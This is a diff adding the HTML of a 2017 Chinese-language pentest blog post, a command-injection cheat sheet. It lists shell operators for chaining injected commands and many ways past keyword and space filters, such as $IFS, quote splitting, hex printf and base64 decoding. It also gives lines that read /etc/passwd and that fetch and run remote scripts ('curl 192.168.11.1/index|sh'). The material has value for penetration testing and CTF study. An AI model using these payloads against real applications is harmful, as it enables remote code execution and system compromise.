@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="zh_CN">
+<head>
+  <meta charset="utf-8">
+  
+  <title>命令注入备忘录 | Exist</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Linux&amp;amp;&amp;amp;先执行前面的，再执行后面的123echo 1 &amp;amp;&amp;amp; echo 2 12 &amp;amp;先执行后面的，再执行前面的123echo 1 &amp;amp; echo 221 ||只执行前面的12echo 1 || echo 21 |只执行后面的12echo 1 | echo 2 2 ;1echo 1;echo 2 `先执行反引号中的1echo `ls` $()同上">
+<meta name="keywords" content="Pentest">
+<meta property="og:type" content="article">
+<meta property="og:title" content="命令注入备忘录">
+<meta property="og:url" content="https://existxfx.github.io/2017/10/25/Command-Injection-Cheatsheet/index.html">
+<meta property="og:site_name" content="Exist">
+<meta property="og:description" content="Linux&amp;amp;&amp;amp;先执行前面的，再执行后面的123echo 1 &amp;amp;&amp;amp; echo 2 12 &amp;amp;先执行后面的，再执行前面的123echo 1 &amp;amp; echo 221 ||只执行前面的12echo 1 || echo 21 |只执行后面的12echo 1 | echo 2 2 ;1echo 1;echo 2 `先执行反引号中的1echo `ls` $()同上">
+<meta property="og:updated_time" content="2017-10-25T17:00:21.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="命令注入备忘录">
+<meta name="twitter:description" content="Linux&amp;amp;&amp;amp;先执行前面的，再执行后面的123echo 1 &amp;amp;&amp;amp; echo 2 12 &amp;amp;先执行后面的，再执行前面的123echo 1 &amp;amp; echo 221 ||只执行前面的12echo 1 || echo 21 |只执行后面的12echo 1 | echo 2 2 ;1echo 1;echo 2 `先执行反引号中的1echo `ls` $()同上">
+  
+  
+    <link rel="icon" href="/favicon.ico">
+  
+  <link rel="stylesheet" href="/css/typing.css">
+  
+  <link rel="stylesheet" href="/css/font-awesome.min.css">
+  
+</head>
+
+  
+    
+      <body class="dark">
+    
+  
+      <div id="container" class="container">
+        <article id="post-Command-Injection-Cheatsheet" class="article article-type-post" itemscope itemprop="blogPost">
+  <header id="header" class="header">
+  <nav id="main-nav" class="main-nav">
+    
+      <a class="main-nav-link" href="/">Home</a>
+    
+      <a class="main-nav-link" href="/archives">Archives</a>
+    
+      <a class="main-nav-link" href="/about">About</a>
+    
+  </nav>
+</header>
+
+  <hr/>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      命令注入备忘录
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry typo" itemprop="articleBody">
+      
+        <!-- toc -->
+<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h4 id="amp-amp"><a href="#amp-amp" class="headerlink" title="&amp;&amp;"></a>&amp;&amp;</h4><p>先执行前面的，再执行后面的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">echo 1 &amp;&amp; echo 2 </div><div class="line">1</div><div class="line">2</div></pre></td></tr></table></figure></p>
+<h4 id="amp"><a href="#amp" class="headerlink" title="&amp;"></a>&amp;</h4><p>先执行后面的，再执行前面的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">echo 1 &amp; echo 2</div><div class="line">2</div><div class="line">1</div></pre></td></tr></table></figure></p>
+<h4 id=""><a href="#" class="headerlink" title="||"></a>||</h4><p>只执行前面的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">echo 1 || echo 2</div><div class="line">1</div></pre></td></tr></table></figure></p>
+<h4 id="-1"><a href="#-1" class="headerlink" title="|"></a>|</h4><p>只执行后面的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">echo 1 | echo 2 </div><div class="line">2</div></pre></td></tr></table></figure></p>
+<h4 id="-2"><a href="#-2" class="headerlink" title=";"></a>;</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo 1;echo 2</div></pre></td></tr></table></figure>
+<h4 id="-3"><a href="#-3" class="headerlink" title="`"></a>`</h4><p>先执行反引号中的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo `ls`</div></pre></td></tr></table></figure></p>
+<h4 id="-4"><a href="#-4" class="headerlink" title="$()"></a>$()</h4><p>同上</p>
+<h4 id="n"><a href="#n" class="headerlink" title="\n"></a>\n</h4><h3 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h3><h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><ul>
+<li><code>ls == l``s</code></li>
+<li><code>ls == l&#39;&#39;s</code></li>
+<li><code>ls == l&quot;&quot;s</code></li>
+<li><code>ls == l&lt;&gt;s</code>（特殊情况）</li>
+<li><code>$(printf &quot;\x6c\x73&quot;)</code><h4 id="读文件的命令"><a href="#读文件的命令" class="headerlink" title="读文件的命令"></a>读文件的命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">cat</div><div class="line">tac</div><div class="line">more</div><div class="line">less</div><div class="line">head</div><div class="line">tail</div><div class="line">nl</div><div class="line">rev</div><div class="line">od * (八进制)</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="列目录命令"><a href="#列目录命令" class="headerlink" title="列目录命令"></a>列目录命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">ls</div><div class="line">l (特定版本<span class="built_in">alias</span>, 16.04)</div><div class="line">la(特定版本<span class="built_in">alias</span>)</div><div class="line">ll(特定版本<span class="built_in">alias</span>)</div><div class="line"><span class="built_in">echo</span> *</div><div class="line"><span class="built_in">printf</span> %s *</div><div class="line">dir</div><div class="line">find ./</div></pre></td></tr></table></figure>
+<h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><ul>
+<li><code>a=l;b=s;$a$b</code></li>
+<li><code>${IFS}  $IFS  $9</code></li>
+<li><code>{ls,-al}</code></li>
+<li><code>ls&lt;&gt;-al</code></li>
+<li><code>CMD=$&#39;\x20-al&#39;&amp;&amp;cat$ls</code></li>
+<li><code>cat&lt;/etc/passwd</code></li>
+<li><code>$cmd=&quot;ls&quot;;$cmd</code></li>
+<li>%09<h3 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h3><blockquote>
+<p><a href="http://blog.csdn.net/number_0_0/article/details/73291182" target="_blank" rel="external">http://blog.csdn.net/number_0_0/article/details/73291182</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">curl 192.168.11.1/index|sh</div><div class="line">Wget -qO - 192.168.1.1|sh</div></pre></td></tr></table></figure>
+</blockquote>
+</li>
+</ul>
+<h4 id="字符串转命令"><a href="#字符串转命令" class="headerlink" title="字符串转命令"></a>字符串转命令</h4><ul>
+<li><p>$()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$(echo ls)</div><div class="line"></div><div class="line">$(printf &apos;\x6c\x73&apos;)</div></pre></td></tr></table></figure>
+</li>
+<li><p>a=ls;$a</p>
+</li>
+<li>a=ls;${a}</li>
+<li>${asdf-`expr  substr “lsabcd” 1 2`}  # asdf为不存在的变量<h4 id="字符串截取（拼接）转命令"><a href="#字符串截取（拼接）转命令" class="headerlink" title="字符串截取（拼接）转命令"></a>字符串截取（拼接）转命令</h4></li>
+<li>${a=l}${b=s}</li>
+<li>${a=l${b=s}}</li>
+<li>$a=labcds;${a:0:1}${a:5:1}</li>
+<li>`echo l``echo s`</li>
+</ul>
+<h3 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo 1 | tee index.php</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">wget 192.168.143.129</div><div class="line"></div><div class="line">curl 192.168.143.129</div></pre></td></tr></table></figure>
+<h4 id="过滤关键字-1"><a href="#过滤关键字-1" class="headerlink" title="过滤关键字"></a>过滤关键字</h4><ul>
+<li>printf<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">16 进制</div><div class="line"></div><div class="line">printf &apos;\x41&apos;</div><div class="line">A</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">8进制</div><div class="line"></div><div class="line">printf &apos;\101&apos;</div></pre></td></tr></table></figure>
+<ul>
+<li>base64<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo bHMK | base64 -d |tee a</div></pre></td></tr></table></figure>
+</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <ul class="article-meta">
+        <li>
+          <span class="label">Published Date:</span>
+          <a href="/2017/10/25/Command-Injection-Cheatsheet/" class="article-date">
+  <time datetime="2017-10-25T16:53:02.000Z" itemprop="datePublished">2017-10-25</time>
+</a>
+
+        </li>
+        
+        
+          <li>
+            <span class="label">Tag:</span>
+            
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pentest/">Pentest</a></li></ul>
+
+
+          </li>
+        
+        <hr/>
+      </ul>
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav" class="article-nav">
+  
+    <a href="/2017/10/25/Basic-Pwn-0x01/" id="article-nav-newer" class="article-nav-link-wrap newer">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Pwn基础学习-泄露libc地址计算system()绕过ASLR
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2017/10/25/Use-userinit-to-maintain-persistence/" id="article-nav-older" class="article-nav-link-wrap older">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">使用userinit实现持久控制</div>
+    </a>
+  
+</nav>
+
+
+  
+</article>
+
+
+
+
+
+
+      </div>
+      
+    <footer id="footer" class="post-footer footer">
+      
+        <ul class="footer-links">
+          
+            <li><a href="/archives"><span class="fa fa-cube"></span></a></li>
+          
+        </ul>
+	    
+      <hr/>
+      <div id="footerContent" class="footer-content">
+        
+
+      </div>
+    </footer>
+
+      
+
+
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/typing.js"></script>
+<!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+
+
+
+
+
+
+
+    </div>
+  </body>
+</html>
